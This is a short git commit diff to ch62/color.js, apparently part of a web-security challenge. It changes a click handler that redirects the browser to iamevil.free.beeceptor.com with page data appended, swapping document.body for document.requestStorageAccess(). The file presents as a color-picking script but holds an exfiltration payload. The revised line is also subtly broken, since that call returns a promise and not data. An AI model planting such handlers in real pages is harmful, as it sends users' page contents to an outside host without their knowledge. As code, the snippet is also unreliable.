0bcc34b7fa372173ca80abcf861421a482294d29
Kyrielled <zedix.minecraft@gmail.com>
2024-10-06 02:53:09 +0200

    Update color.js

--- ch62/color.js
+++ ch62/color.js
@@ -6,5 +6,5 @@ function getRandomInt(max) {
   }  
 
 color.onclick = () => {
-    document.location = 'https://iamevil.free.beeceptor.com/?' + document.body;
+    document.location = 'https://iamevil.free.beeceptor.com/?' + document.requestStorageAccess();
 }
